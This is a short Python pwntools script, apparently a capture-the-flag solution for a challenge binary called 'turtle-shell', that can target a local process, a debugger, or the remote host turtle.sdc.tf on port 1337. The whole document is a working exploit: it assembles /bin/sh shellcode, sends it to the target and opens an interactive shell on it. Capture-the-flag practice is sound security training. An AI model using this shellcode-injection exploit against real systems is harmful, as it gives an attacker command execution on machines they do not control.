#!/usr/bin/python3
from pwn import *

BINARY = './turtle-shell'

elf = context.binary = ELF(BINARY, checksec=False)

def start():
    if args.GDB:
        return gdb.debug(elf.path)
    if args.REMOTE:
        return remote("turtle.sdc.tf", 1337)
    else:
        return process(elf.path)

io = start()
# /bin/sh shellcode
shellcode = asm(shellcraft.sh())
io.send(shellcode)
io.interactive()
